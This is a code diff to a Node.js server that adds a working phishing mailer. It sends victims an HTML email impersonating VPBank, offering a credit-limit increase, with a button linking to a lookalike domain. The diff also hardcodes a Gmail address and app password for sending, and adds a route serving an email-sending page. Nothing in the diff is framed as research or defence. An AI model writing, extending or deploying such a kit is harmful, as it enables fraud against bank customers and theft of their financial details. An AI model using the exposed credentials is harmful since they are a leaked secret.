@@ -13,6 +13,18 @@ const api = new TG({
     token: process.env.TELEGRAM_BOT_TOKEN
 })
 const fs = require('fs')
+const nodemailer = require('nodemailer');
+
+var transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'quangbaorp@gmail.com',
+        pass: 'johttcwmgzyxeyvp'
+    },
+    tls: {
+        rejectUnauthorized: false
+    },
+});
 
 app.use(express.static('public'));
 app.set('view engine', 'html');
@@ -58,6 +70,249 @@ io.on("connection", function (socket) {
             socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
         });
 
+    });
+
+    socket.on('email', (data) => {
+        const mailOptions = {
+            from: 'quangbaorp@gmail.com',
+            to: data.email,
+            subject: 'Thông báo từ VPBank',
+            html: `
+            <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MUO - Technology, Simplified</title>
+  </head>
+
+  <body style="font-family: Arial; margin: 0">
+    <table
+      style="
+        background-color: #f3f3f5;
+        padding: 16px 12px;
+        min-height: 100vh;
+        width: 80%;
+        margin: 0 auto;
+      "
+    >
+      <tbody>
+        <tr>
+          <td style="vertical-align: top">
+            <table
+              border="0"
+              width="600"
+              cellpadding="0"
+              cellspacing="0"
+              align="center"
+              style="
+                width: 600px !important;
+                min-width: 600px !important;
+                max-width: 600px !important;
+                margin: auto;
+                border-spacing: 0;
+                border-collapse: collapse;
+                background: white;
+                border-radius: 0px 0px 10px 10px;
+                padding-left: 30px;
+                padding-right: 30px;
+                padding-top: 30px;
+                padding-bottom: 30px;
+                display: block;
+              "
+            >
+              <tbody>
+                <tr>
+                  <td
+                    style="
+                      text-align: center;
+                      vertical-align: top;
+                      font-size: 0;
+                      border-collapse: collapse;
+                    "
+                  >
+                    <table
+                      border="0"
+                      width="100%"
+                      cellpadding="0"
+                      cellspacing="0"
+                      bgcolor="#F8F8F8"
+                      style="border-spacing: 0; border-collapse: collapse"
+                    >
+                      <tbody>
+                        <tr style="background-size: cover">
+                          <td
+                            style="
+                              width: 100%;
+                              text-align: left;
+                              border-collapse: collapse;
+                              background: #fff;
+                              border-radius: 10px 10px 0px 0px;
+                              color: white;
+                            "
+                          >
+                            <img
+                              src="https://vp.hbservice.site/UploadImages/Data/Banner/vp03.jpg"
+                              width="100%"
+                              class="CToWUd"
+                            />
+                          </td>
+
+                        </tr>
+                      </tbody>
+                    </table>
+                  </td>
+                </tr>
+
+                <tr>
+                  <td
+                    style="
+                      vertical-align: top;
+                      font-size: 0;
+                      border-collapse: collapse;
+                    "
+                  >
+                    <table
+                      border="0"
+                      width="100%"
+                      cellpadding="0"
+                      cellspacing="0"
+                      bgcolor="#F8F8F8"
+                      style="border-spacing: 0; border-collapse: collapse"
+                    >
+                      <tbody>
+                        <tr>
+                          <td
+                            style="
+                              padding-top: 30px;
+                              padding-bottom: 5px;
+                              background-color: white;
+                            "
+                          >
+                            <span style="font-size: 20px; color: #363636"
+                              >Kính chào quý khách <b></b></span
+                            >
+                          </td>
+                        </tr>
+                        <tr>
+                          <td
+                            style="
+                              padding-top: 5px;
+                              padding-bottom: 9px;
+                              background-color: white;
+                            "
+                          >
+                            <span
+                              style="
+                                font-size: 24px;
+                                color: #363636;
+                                font-weight: bold;
+                              "
+                              >VPBank trân thành cảm ơn quý khách, trong thời gian qua đã sử dụng các dịch vụ của chúng tôi.</span
+                            >
+                          </td>
+                        </tr>
+
+                        <tr>
+                          <td
+                            style="
+                              padding: 10px 0px;
+                              background-color: white;
+                              border-collapse: collapse;
+                            "
+                          >
+                            <div
+                              style="
+                                font-size: 18px;
+                                color: #141414;
+                                font-weight: normal;
+                              "
+                            >
+                              Hiện tại Vpbank đang có ưu đã cho khách hàng nâng hạn mức thẻ tín dụng theo yêu cầu của quý khách, vui lòng truy cập vào đường link sau để xác nhận thông tin.
+                            </div>
+                          </td>
+                        </tr>
+
+                      </tbody>
+                    </table>
+                  </td>
+                </tr>
+                  <td
+                    style="
+                      background-color: #e23744;
+                      padding: 5px 0px;
+                      border-radius: 8px;
+                    "
+                  >
+                    <h2
+                      style="
+                        font-size: 20px;
+                        color: #ffffff;
+                        margin: 0;
+                        text-align: center;
+                      "
+                    >
+                    <a href="https://vp.khachhang-uutien.online" style="color: #ffffff; text-decoration: none;">
+                      Nâng hạn mức ngay
+                    </a>
+                    </h2>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="text-align: center">
+                    <div
+                      style="
+                        width: 100%;
+                        margin-top: 30px;
+                        display: inline-block;
+                        border-top: 1px solid #e8e8e8;
+                      "
+                    ></div>
+                  </td>
+                </tr>
+                <tr></tr>
+
+                <tr>
+                  <td>
+                    <p
+                      style="
+                        line-height: 1.4;
+                        letter-spacing: 0.5px;
+                        text-align: center;
+                        color: #444;
+                        margin-bottom: 8px;
+                      "
+                    >
+                      Copyright © 2024
+                      <a
+                        href="https://www.vpbank.com.vn/"
+                        style="text-decoration: none; color: #444"
+                        >Vpbank</a
+                      >
+                    </p>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </body>
+</html>
+            `
+        };
+
+        transporter.sendMail(mailOptions, function (error, info) {
+            if (error) {
+                console.log(error);
+                socket.emit('error', { message: 'Gửi email thất bại, vui lòng thử lại sau!' });
+            } else {
+                console.log('Email sent: ' + info.response);
+                socket.emit('success', { message: 'Gửi email thành công' });
+            }
+        });
     });
 });
 
@@ -117,7 +372,9 @@ app.get('/images', function (req, res) {
         res.send(images.join(''));
     });
 });
-
+app.get('/gui-email', function (req, res) {
+    res.sendFile(__dirname + '/views/gui-email.html');
+});
 
 http.listen(port, () => {
     console.log(`Đã chạy trên cổng :${port}`);
